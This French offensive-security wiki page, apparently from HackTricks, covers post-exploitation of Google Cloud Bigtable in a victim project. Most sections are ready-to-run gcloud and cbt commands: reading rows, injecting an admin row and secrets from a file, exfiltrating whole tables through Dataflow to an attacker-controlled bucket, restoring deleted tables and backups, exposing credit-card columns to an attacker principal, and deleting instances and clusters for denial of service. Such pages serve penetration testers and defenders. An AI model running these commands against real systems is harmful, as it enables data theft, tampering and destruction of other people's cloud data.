# GCP - Bigtable Post-exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Pour plus d'informations sur Bigtable, consultez :

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Installez l'interface en ligne de commande `cbt` une fois via le Cloud SDK afin que les commandes ci-dessous fonctionnent localement :
>
> ```bash
> gcloud components install cbt
> ```

### Lire les lignes

**Permissions :** `bigtable.tables.readRows`

`cbt` est fourni avec le Cloud SDK et interagit directement avec les APIs admin/data sans passer par un middleware. Pointez-le vers le projet/instance compromis et extrayez les lignes directement de la table. Limitez le scan si vous ne voulez qu'un aperçu.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### Écrire des lignes

**Autorisations :** `bigtable.tables.mutateRows`, (vous aurez besoin de `bigtable.tables.readRows` pour confirmer la modification).

Utilisez le même outil pour upsert des cellules arbitraires. C'est le moyen le plus rapide pour backdoorer des configs, déposer des web shells, ou implanter des rows de dataset empoisonnées.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` accepte des octets bruts via la syntaxe `@/path`, vous pouvez donc pousser des compiled payloads ou des serialized protobufs exactement comme les downstream services s'y attendent.

### Exporter les lignes vers votre bucket

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Il est possible d'exfiltrer le contenu d'une table entière vers un bucket contrôlé par l'attaquant en lançant un job Dataflow qui envoie les lignes vers un bucket GCS que vous contrôlez.

> [!NOTE]
> Notez que vous aurez besoin de la permission `iam.serviceAccounts.actAs` sur un SA disposant de permissions suffisantes pour effectuer l'export (par défaut, si cela n'est pas indiqué autrement, le default compute SA sera utilisé).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Changez le modèle pour `Cloud_Bigtable_to_GCS_Parquet` ou `Cloud_Bigtable_to_GCS_SequenceFile` si vous voulez des sorties Parquet/SequenceFile au lieu de JSON. Les permissions sont les mêmes ; seul le chemin du modèle change.

### Importer des lignes

**Autorisations:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Il est possible d'importer le contenu d'une table entière depuis un bucket contrôlé par l'attaquant en lançant un job Dataflow qui stream des lignes vers un bucket GCS que vous contrôlez. Pour cela, l'attaquant devra d'abord créer un fichier parquet contenant les données à importer avec le schéma attendu. Un attaquant pourrait d'abord exporter les données au format parquet en suivant la technique précédente avec le paramètre `Cloud_Bigtable_to_GCS_Parquet` et ajouter de nouvelles entrées dans le fichier parquet téléchargé



> [!NOTE]
> Notez que vous aurez besoin de l'autorisation `iam.serviceAccounts.actAs` sur un SA disposant des permissions suffisantes pour effectuer l'export (par défaut, si rien d'autre n'est indiqué, le SA compute par défaut sera utilisé).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### Restauration des sauvegardes

**Permissions:** `bigtable.backups.restore`, `bigtable.tables.create`.

Un attaquant disposant de ces permissions peut restaurer une sauvegarde dans une nouvelle table sous son contrôle afin de pouvoir récupérer d'anciennes données sensibles.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### Restaurer des tables

**Permissions:** `bigtable.tables.undelete`

Bigtable prend en charge la suppression temporaire avec une période de grâce (généralement 7 jours par défaut). Pendant cette fenêtre, un attaquant disposant de l'autorisation `bigtable.tables.undelete` peut restaurer une table récemment supprimée et récupérer toutes ses données, pouvant accéder à des informations sensibles considérées comme détruites.

Ceci est particulièrement utile pour :
- Récupérer des données depuis des tables supprimées par les défenseurs lors de la réponse aux incidents
- Accéder à des données historiques qui ont été intentionnellement purgées
- Annuler des suppressions accidentelles ou malveillantes pour maintenir la persistance
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> L'opération undelete ne fonctionne que dans la période de rétention configurée (par défaut 7 jours). Après l'expiration de cette fenêtre, la table et ses données sont définitivement supprimées et ne peuvent pas être récupérées par cette méthode.


### Créer des Authorized Views

**Autorisations :** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Authorized views vous permettent de présenter un sous-ensemble sélectionné de la table. Au lieu de respecter le principe du moindre privilège, utilisez-les pour publier **exactement les ensembles de colonnes/lignes sensibles** qui vous intéressent et whitelist your own principal.

> [!WARNING]
> Le problème est que pour créer une authorized view, vous devez aussi pouvoir lire et muter des lignes dans la table de base ; vous n'obtenez donc aucune permission supplémentaire, et cette technique est donc essentiellement inutile.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
Comme l'accès est limité à la view, les défenseurs négligent souvent le fait que vous venez de créer un nouveau point de terminaison à haute sensibilité.

### Read Authorized Views

**Permissions:** `bigtable.authorizedViews.readRows`

Si vous avez accès à un Authorized View, vous pouvez lire des données depuis celui-ci en utilisant les bibliothèques clientes Bigtable en spécifiant le nom de l'Authorized View dans vos requêtes de lecture. Notez que l'Authorized View limitera probablement ce à quoi vous avez accès dans la table. Ci-dessous un exemple en Python:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service via Delete Operations

**Autorisations :** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Toutes les permissions de suppression de Bigtable peuvent être exploitées pour des denial of service attacks. Un attaquant disposant de ces autorisations peut perturber les opérations en supprimant des ressources Bigtable critiques :

- **`bigtable.appProfiles.delete`**: Supprimer les profils d'application, rompant les connexions clientes et les configurations de routage
- **`bigtable.authorizedViews.delete`**: Retirer des vues autorisées, coupant les chemins d'accès légitimes pour les applications
- **`bigtable.authorizedViews.deleteTagBinding`**: Supprimer les liaisons de tags des vues autorisées
- **`bigtable.backups.delete`**: Détruire les instantanés de sauvegarde, éliminant les options de reprise après sinistre
- **`bigtable.clusters.delete`**: Supprimer des clusters entiers, provoquant une indisponibilité immédiate des données
- **`bigtable.instances.delete`**: Supprimer des instances Bigtable complètes, effaçant toutes les tables et configurations
- **`bigtable.tables.delete`**: Supprimer des tables individuelles, entraînant une perte de données et des défaillances d'application
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> Les opérations de suppression sont souvent immédiates et irréversibles. Assurez-vous que des sauvegardes existent avant de tester ces commandes, car elles peuvent provoquer une perte de données permanente et une interruption majeure du service.

{{#include ../../../banners/hacktricks-training.md}}
